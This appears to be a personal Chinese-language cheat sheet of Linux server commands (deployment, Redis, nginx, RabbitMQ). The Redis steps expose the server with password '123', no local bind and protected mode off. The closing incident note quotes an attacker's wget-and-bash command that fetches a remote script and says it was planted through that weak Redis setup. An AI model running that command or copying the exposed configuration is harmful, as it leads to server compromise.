@@ -1,0 +1,152 @@
+  centos 8.0.11
+1、磁盘可用空间
+	df -hl
+	df /hulei #查看目录挂载点
+2、查看linux版本信息
+	cat /etc/redhat-release
+3、切换root用户
+	su
+4、安装jdk1.8
+	yum install java-1.8java-1.8.0-openjdk* -y
+5、检索可用java资源
+	yum list java-1.8*
+6、ubuntu vnc报错
+	tightvncserver: could not open default font 'fixed'
+	apt-get install xfonts-base
+	
+7、查看进程
+	netstat -lp|grep -i vnc
+8、查询安装包
+	dpkg-query -l *vnc*
+9、查看文本、编辑文本
+	jcat 1.txt
+	vi 1.txt
+		i
+		esc
+		:wq
+10、创建文件、文件夹，删除空文件夹
+	touch 1.txt
+	mkdir q
+	rmdir 1
+11、ubuntu 中文乱码
+	https://www.centos.bz/2017/12/%E8%A7%A3%E5%86%B3ubuntu%E7%9A%84%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/
+12、卸载xfce4，安装unity
+	https://blog.csdn.net/qq_42906907/article/details/82894096
+13、xstartup配置
+	export XKL_XMODMAP_DISABLE=1
+	unset SESSION_MANAGER
+	unset DBUS_SESSION_BUS_ADDRESS
+	gnome-panel &
+	gnome-settings-daemon &
+	metacity &
+	nautilus &
+	gnome-terminal &
+14、ubuntu安装openjdk
+	https://blog.csdn.net/wukery/article/details/79467468
+15、设置文件夹权限
+	chmod 777 mvn
+16、重新编译
+	source /etc/profile
+17、解压gz包
+	tar zxvf file
+	z -> gz包 x -> tar包 v -> 显示详细信息 f -> file文件名称
+18、su登录找不到mvn
+	https://www.cnblogs.com/byrf/articles/10446916.html
+19、重新部署vue和java
+ 	pwd #显示当前目录
+  部署vue
+    cd /hulei/vueTest #进入醒目根目录
+    git pull #拉取代码
+    npm install #更新依赖
+    npm run build #打包dist目录
+    不需要重启nginx，只要刷新页面即可
+	npm config set registry=https://registry.npm.taobao.org
+	npm config list
+  部署java
+    ps -ef|grep java #显示当前进程
+    kill -9 [pid] #停止进程,-9表示立即停止
+    cd /hulei/learningsql #进入项目根目录
+    git pull #拉代码
+    mvn package -Dmaven.test.skip=true -f pom.xml #打包
+    cd target #进入targe目录
+    nohup java -jar sqllearning-0.0.1-SNAPSHOT.jar --spring.profiles.active=dev #执行jar包
+20、linux安装redis
+    cd /hulei/app/redis/install/redis-4.0.8
+    1、下载tar
+    wget http://download.redis.io/releases/redis-4.0.8.tar.gz
+    2、移动tar包到install目录中
+    mv redis-4.0.8.tar.gz install
+    3、解压tar包，解压到install目录中
+    tar -xzf redis-4.0.8.tar.gz install
+    4、编译redis，需要先安装gcc
+        a、进入redis安装目录, 输入 make 编译
+        b、继续进入子目录src中，输入 make install 安装redis
+        c、返回redis安装目录，修改redis-conf中 daemonize no 为 daemonize yes
+        d、重新进入子目录src中，输入redis-server ../redis-conf, 指定配置文件启动redis
+    5、断开linux连接，重新连接到linux，查看redis是否后台启动
+        ps -aux |grep redis
+    6、aliyun服务器配置redis端口白名单
+    7、修改redis-conf，redis需要配置密码或者绑定端口，或者解除保护模式，否则只能被本地访问
+        a、解开requirepass，设置为requirepass 123
+        b、注释掉bind 127.0.0.1，不要绑定本地，则可以被外网访问
+        c、protect mode 修改为no，关闭保护模式，设置了密码，不需要保护模式
+        d、vim redis-conf, 进入vim的command模式
+           /requirepass 回车，n查找下一个，i进入编辑模式
+           esc退出编辑模式，:wq保存退出
+    8、重启redis，redis通过源码安装的，通过redis-cli关闭，或者kill杀掉进程
+        redis-cli -h 127.0.0.1 -p 6379 shutdown #如果设置了密码加参数，-a 密码
+        ps #查询redis-server进程是否停止了
+        redis-server ../redis-conf #指定配置文件启动redis，否则密码不能生效
+21、删除非空文件夹
+    rm -rf /home/test
+22、查看进程，通过grep过滤关键字
+    ps -aux |grep key #aux为参数，具体参数请百度
+    netstat -lnpt |grep key
+    jps -l |grep key #jdk提供的工具，用于查看java进程
+23、nginx安装
+    1、nginx，生成nginx.pid文件
+    ./nginx -c /usr/local/nginx/conf/nginx.conf
+    2、重启nginx
+    ./nginx -s reload
+    3、平滑重启nginx
+    kill -HUP  16730
+24、修改挂载点
+    /etc/fstab
+    reboot
+25、mctcs控制局域网中win10
+26、centos8中安装rabbitmq，注意安装包必须和centos版本匹配
+    0、本文参考地址 https://blog.csdn.net/haveqing/article/details/105480154
+    1、lsb_release -a # 查看centos版本为8.1.1911，所以其他软件都是这个版本的
+    2、软件下载地址
+        a、erlang
+            https://github.com/rabbitmq/erlang-rpm/releases
+            https://dl.bintray.com/rabbitmq-erlang/rpm/erlang/22/el/8/x86_64/
+        b、socat
+            https://centos.pkgs.org/8/centos-appstream-x86_64/socat-1.7.3.2-6.el8.x86_64.rpm.html
+            http://mirror.centos.org/centos/8/AppStream/x86_64/os/Packages/socat-1.7.3.2-6.el8.x86_64.rpm
+        c、rabbitmq-server
+            https://github.com/rabbitmq/rabbitmq-server/releases/
+            https://dl.bintray.com/rabbitmq/rpm/rabbitmq-server/v3.8.x/el/8/noarch/
+    3、rmp安装包放到linux服务器上，yum安装
+        yum install ./erlang-22.3.2-1.el8.x86_64.rpm
+        yum install ./socat-1.7.3.2-6.el8.x86_64.rpm
+        yum install ./rabbitmq-server-3.8.3-1.el8.noarch.rpm
+    4、启动rabbitmq
+        service rabbitmq-server start 启动服务
+        service rabbitmq-server stop # 关闭服务
+        service rabbitmq-server status # 查看状态
+        service rabbitmq-server restart # 重启
+27、markdown云写作方案
+    通过github同步，github有web版和mobile-web版，通过浏览器访问编辑
+    pc端通过typaro编辑，然后上传到github私密文档库
+
+28、aliyun服务的安全事故
+    背景：
+        阿里云检测到恶意脚本如下在执行：
+        父进程命令行：/bin/sh -c wget http://d.powerofwish.com/pm.sh -O .p && bash .p
+        百度一下发现脚本可能是通过redis set进去的
+        登录redis发现被set了back1、back2、back3、back4，内容就是如上远程脚本的定时执行
+    原因：
+        是redis的密码放在git的开源项目中，或者是因为redis密码设置为123太简单，被扫描了
+    解决方案：
+        redis设置复杂密码，redis密码通过文件配置中心读取(本地文件-git上私密库)
